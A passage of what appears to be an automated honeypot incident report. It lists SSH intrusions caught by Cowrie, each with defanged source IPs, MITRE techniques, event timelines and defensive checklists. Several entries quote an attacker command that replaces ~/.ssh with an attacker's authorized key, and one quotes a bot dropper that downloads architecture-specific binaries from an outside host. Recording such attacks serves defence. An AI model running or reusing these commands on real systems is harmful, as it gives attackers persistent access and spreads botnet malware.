| `2026-06-01 12:56:26` | `cowrie.login.success` |
| `2026-06-01 12:56:27` | `cowrie.session.params` |
| `2026-06-01 12:56:27` | `cowrie.command.input` |
| `2026-06-01 12:56:27` | `cowrie.command.failed` |
| `2026-06-01 12:56:27` | `cowrie.log.closed` |
| `2026-06-01 12:56:27` | `cowrie.session.params` |
| `2026-06-01 12:56:27` | `cowrie.command.input` |
| `2026-06-01 12:56:27` | `cowrie.session.file_download` |
| `2026-06-01 12:56:27` | `cowrie.log.closed` |
| `2026-06-01 12:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30ab95466f3

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:56 |
| **Last Seen** | 2026-06-01 12:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:56:29` | `cowrie.session.connect` |
| `2026-06-01 12:56:29` | `cowrie.client.version` |
| `2026-06-01 12:56:29` | `cowrie.client.kex` |
| `2026-06-01 12:56:30` | `cowrie.login.success` |
| `2026-06-01 12:56:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c17776d53c00

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:58 |
| **Last Seen** | 2026-06-01 12:58 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:58:48` | `cowrie.session.connect` |
| `2026-06-01 12:58:48` | `cowrie.client.version` |
| `2026-06-01 12:58:48` | `cowrie.client.kex` |
| `2026-06-01 12:58:49` | `cowrie.login.success` |
| `2026-06-01 12:58:49` | `cowrie.session.params` |
| `2026-06-01 12:58:49` | `cowrie.command.input` |
| `2026-06-01 12:58:49` | `cowrie.command.failed` |
| `2026-06-01 12:58:49` | `cowrie.log.closed` |
| `2026-06-01 12:58:50` | `cowrie.session.params` |
| `2026-06-01 12:58:50` | `cowrie.command.input` |
| `2026-06-01 12:58:50` | `cowrie.session.file_download` |
| `2026-06-01 12:58:50` | `cowrie.log.closed` |
| `2026-06-01 12:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b08de594db11

| Field | Detail |
|---|---|
| **Source IP** | `61.76.112[.]4` |
| **First Seen** | 2026-06-01 12:58 |
| **Last Seen** | 2026-06-01 12:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 12:58:52` | `cowrie.session.connect` |
| `2026-06-01 12:58:52` | `cowrie.client.version` |
| `2026-06-01 12:58:52` | `cowrie.client.kex` |
| `2026-06-01 12:58:53` | `cowrie.login.success` |
| `2026-06-01 12:58:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.76.112[.]4` to AbuseIPDB if not already reported
- [ ] Block `61.76.112[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9157d30a6a0

| Field | Detail |
|---|---|
| **Source IP** | `156.255.1[.]208` |
| **First Seen** | 2026-06-01 14:05 |
| **Last Seen** | 2026-06-01 14:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:05:40` | `cowrie.session.connect` |
| `2026-06-01 14:05:40` | `cowrie.client.version` |
| `2026-06-01 14:05:40` | `cowrie.client.kex` |
| `2026-06-01 14:05:41` | `cowrie.login.success` |
| `2026-06-01 14:05:41` | `cowrie.session.params` |
| `2026-06-01 14:05:41` | `cowrie.command.input` |
| `2026-06-01 14:05:41` | `cowrie.command.failed` |
| `2026-06-01 14:05:41` | `cowrie.log.closed` |
| `2026-06-01 14:05:41` | `cowrie.session.params` |
| `2026-06-01 14:05:41` | `cowrie.command.input` |
| `2026-06-01 14:05:42` | `cowrie.session.file_download` |
| `2026-06-01 14:05:42` | `cowrie.log.closed` |
| `2026-06-01 14:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.255.1[.]208` to AbuseIPDB if not already reported
- [ ] Block `156.255.1[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c5dfe43470a2

| Field | Detail |
|---|---|
| **Source IP** | `156.255.1[.]208` |
| **First Seen** | 2026-06-01 14:05 |
| **Last Seen** | 2026-06-01 14:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:05:44` | `cowrie.session.connect` |
| `2026-06-01 14:05:44` | `cowrie.client.version` |
| `2026-06-01 14:05:44` | `cowrie.client.kex` |
| `2026-06-01 14:05:44` | `cowrie.login.success` |
| `2026-06-01 14:05:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.255.1[.]208` to AbuseIPDB if not already reported
- [ ] Block `156.255.1[.]208` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-564f420c5d18

| Field | Detail |
|---|---|
| **Source IP** | `185.220.177[.]34` |
| **First Seen** | 2026-06-01 14:06 |
| **Last Seen** | 2026-06-01 14:07 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, arch=$(uname -m); case $arch in i386|i486|i586|i686) f="main_x86";; x86_64) f="main_x86_64";; mips) f="main_mips";; mipsel) f="main_mpsl";; armv4l|armv4tl) f="main_arm";; armv5l|armv5tel) f="main_arm5";; armv6l) f="main_arm6";; armv7l) f="main_arm7";; powerpc) f="main_ppc";; m68k) f="main_m68k";; sh4) f="main_sh4";; sparc) f="main_spc";; *) exit 1;; esac; if command -v wget >/dev/null; then wget -O /tmp/bot hxxp://skynet8.ydns.eu/$f; elif command -v curl >/dev/null; then curl -o /tmp/bot hxxp://skynet8.ydns, uname -m` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:06:55` | `cowrie.session.connect` |
| `2026-06-01 14:06:56` | `cowrie.login.success` |
| `2026-06-01 14:06:56` | `cowrie.session.params` |
| `2026-06-01 14:06:58` | `cowrie.command.input` |
| `2026-06-01 14:06:58` | `cowrie.command.input` |
| `2026-06-01 14:06:58` | `cowrie.command.input` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:06:58` | `cowrie.command.failed` |
| `2026-06-01 14:07:13` | `cowrie.log.closed` |
| `2026-06-01 14:07:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.220.177[.]34` to AbuseIPDB if not already reported
- [ ] Block `185.220.177[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88f9b2c2865b

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:17 |
| **Last Seen** | 2026-06-01 14:17 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:17:25` | `cowrie.session.connect` |
| `2026-06-01 14:17:25` | `cowrie.client.version` |
| `2026-06-01 14:17:25` | `cowrie.client.kex` |
| `2026-06-01 14:17:26` | `cowrie.login.success` |
| `2026-06-01 14:17:26` | `cowrie.session.params` |
| `2026-06-01 14:17:26` | `cowrie.command.input` |
| `2026-06-01 14:17:26` | `cowrie.command.failed` |
| `2026-06-01 14:17:26` | `cowrie.log.closed` |
| `2026-06-01 14:17:26` | `cowrie.session.params` |
| `2026-06-01 14:17:26` | `cowrie.command.input` |
| `2026-06-01 14:17:26` | `cowrie.session.file_download` |
| `2026-06-01 14:17:26` | `cowrie.log.closed` |
| `2026-06-01 14:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fc37d94a3e1

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:17 |
| **Last Seen** | 2026-06-01 14:17 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:17:29` | `cowrie.session.connect` |
| `2026-06-01 14:17:29` | `cowrie.client.version` |
| `2026-06-01 14:17:29` | `cowrie.client.kex` |
| `2026-06-01 14:17:29` | `cowrie.login.success` |
| `2026-06-01 14:17:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7d80994d2f15

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:18 |
| **Last Seen** | 2026-06-01 14:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:18:27` | `cowrie.session.connect` |
| `2026-06-01 14:18:27` | `cowrie.client.version` |
| `2026-06-01 14:18:27` | `cowrie.client.kex` |
| `2026-06-01 14:18:28` | `cowrie.login.success` |
| `2026-06-01 14:18:28` | `cowrie.session.params` |
| `2026-06-01 14:18:28` | `cowrie.command.input` |
| `2026-06-01 14:18:28` | `cowrie.command.failed` |
| `2026-06-01 14:18:29` | `cowrie.log.closed` |
| `2026-06-01 14:18:29` | `cowrie.session.params` |
| `2026-06-01 14:18:29` | `cowrie.command.input` |
| `2026-06-01 14:18:30` | `cowrie.session.file_download` |
| `2026-06-01 14:18:30` | `cowrie.log.closed` |
| `2026-06-01 14:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5d72bc1c30e

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:18 |
| **Last Seen** | 2026-06-01 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:18:32` | `cowrie.session.connect` |
| `2026-06-01 14:18:32` | `cowrie.client.version` |
| `2026-06-01 14:18:32` | `cowrie.client.kex` |
| `2026-06-01 14:18:33` | `cowrie.login.success` |
| `2026-06-01 14:18:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0da558884e9

| Field | Detail |
|---|---|
| **Source IP** | `218.150.184[.]241` |
| **First Seen** | 2026-06-01 14:18 |
| **Last Seen** | 2026-06-01 14:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:18:45` | `cowrie.session.connect` |
| `2026-06-01 14:18:45` | `cowrie.client.version` |
| `2026-06-01 14:18:45` | `cowrie.client.kex` |
| `2026-06-01 14:18:46` | `cowrie.login.success` |
| `2026-06-01 14:18:46` | `cowrie.session.params` |
| `2026-06-01 14:18:46` | `cowrie.command.input` |
| `2026-06-01 14:18:46` | `cowrie.command.failed` |
| `2026-06-01 14:18:47` | `cowrie.log.closed` |
| `2026-06-01 14:18:47` | `cowrie.session.params` |
| `2026-06-01 14:18:47` | `cowrie.command.input` |
| `2026-06-01 14:18:47` | `cowrie.session.file_download` |
| `2026-06-01 14:18:47` | `cowrie.log.closed` |
| `2026-06-01 14:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.150.184[.]241` to AbuseIPDB if not already reported
- [ ] Block `218.150.184[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9bec7266d0ef

| Field | Detail |
|---|---|
| **Source IP** | `218.150.184[.]241` |
| **First Seen** | 2026-06-01 14:18 |
| **Last Seen** | 2026-06-01 14:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:18:49` | `cowrie.session.connect` |
| `2026-06-01 14:18:49` | `cowrie.client.version` |
| `2026-06-01 14:18:49` | `cowrie.client.kex` |
| `2026-06-01 14:18:50` | `cowrie.login.success` |
| `2026-06-01 14:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.150.184[.]241` to AbuseIPDB if not already reported
- [ ] Block `218.150.184[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-57774957927a

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:19 |
| **Last Seen** | 2026-06-01 14:19 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:19:18` | `cowrie.session.connect` |
| `2026-06-01 14:19:18` | `cowrie.client.version` |
| `2026-06-01 14:19:18` | `cowrie.client.kex` |
| `2026-06-01 14:19:18` | `cowrie.login.success` |
| `2026-06-01 14:19:19` | `cowrie.session.params` |
| `2026-06-01 14:19:19` | `cowrie.command.input` |
| `2026-06-01 14:19:19` | `cowrie.command.failed` |
| `2026-06-01 14:19:19` | `cowrie.log.closed` |
| `2026-06-01 14:19:19` | `cowrie.session.params` |
| `2026-06-01 14:19:19` | `cowrie.command.input` |
| `2026-06-01 14:19:19` | `cowrie.session.file_download` |
| `2026-06-01 14:19:19` | `cowrie.log.closed` |
| `2026-06-01 14:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-de8e86a3d1d7

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:19 |
| **Last Seen** | 2026-06-01 14:19 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:19:21` | `cowrie.session.connect` |
| `2026-06-01 14:19:21` | `cowrie.client.version` |
| `2026-06-01 14:19:21` | `cowrie.client.kex` |
| `2026-06-01 14:19:22` | `cowrie.login.success` |
| `2026-06-01 14:19:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `173.212.212[.]105` to AbuseIPDB if not already reported
- [ ] Block `173.212.212[.]105` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a7651c7735a8

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:22 |
| **Last Seen** | 2026-06-01 14:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:22:08` | `cowrie.session.connect` |
| `2026-06-01 14:22:08` | `cowrie.client.version` |
| `2026-06-01 14:22:08` | `cowrie.client.kex` |
| `2026-06-01 14:22:10` | `cowrie.login.success` |
| `2026-06-01 14:22:10` | `cowrie.session.params` |
| `2026-06-01 14:22:10` | `cowrie.command.input` |
| `2026-06-01 14:22:10` | `cowrie.command.failed` |
| `2026-06-01 14:22:10` | `cowrie.log.closed` |
| `2026-06-01 14:22:11` | `cowrie.session.params` |
| `2026-06-01 14:22:11` | `cowrie.command.input` |
| `2026-06-01 14:22:11` | `cowrie.session.file_download` |
| `2026-06-01 14:22:11` | `cowrie.log.closed` |
| `2026-06-01 14:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1da94137d047

| Field | Detail |
|---|---|
| **Source IP** | `59.26.132[.]170` |
| **First Seen** | 2026-06-01 14:22 |
| **Last Seen** | 2026-06-01 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-01 14:22:13` | `cowrie.session.connect` |
| `2026-06-01 14:22:13` | `cowrie.client.version` |
| `2026-06-01 14:22:13` | `cowrie.client.kex` |
| `2026-06-01 14:22:15` | `cowrie.login.success` |
| `2026-06-01 14:22:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `59.26.132[.]170` to AbuseIPDB if not already reported
- [ ] Block `59.26.132[.]170` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-182aa7e10428

| Field | Detail |
|---|---|
| **Source IP** | `173.212.212[.]105` |
| **First Seen** | 2026-06-01 14:23 |
| **Last Seen** | 2026-06-01 14:23 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
